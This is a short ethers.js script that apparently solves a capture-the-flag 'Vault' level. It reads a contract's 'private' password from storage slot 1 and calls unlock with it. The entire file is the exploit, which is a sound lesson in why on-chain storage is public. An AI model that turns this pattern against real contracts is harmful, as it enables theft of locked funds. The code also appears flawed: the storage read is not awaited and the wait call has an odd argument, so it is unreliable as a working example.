const { Signer, ethers, utils } = require("ethers");
const { providers, Wallet, Contract } = require("ethers").ethers;
const { parseUnits, formatUnits } = require('ethers').utils
const fs = require("fs")
require('dotenv').config();
const path = require('path')
require('dotenv').config({ path: path.resolve(__dirname, '../.env') })

const provider = new providers.WebSocketProvider(process.env.RPC_URL)
let wallet = new Wallet(process.env.PKEY).connect(provider)

const main = async (contractAddress, filename) => {

    const ABI = JSON.parse(fs.readFileSync(filename, "utf-8"))
    const target = new Contract(contractAddress, ABI, provider)
    const targetWithSigner = target.connect(wallet)

    
    const password = provider.getStorageAt(contractAddress, 1)
    const transactionResponse = await targetWithSigner.unlock(password)
    await transactionResponse.wait([confirms = 1]).then(console.log)
}



let CA = "0xd802fafdB259CAE51ff7a65e34fB3f853A0e74E0"
let FILENAME = "Vault_abi.json"
main(CA, FILENAME)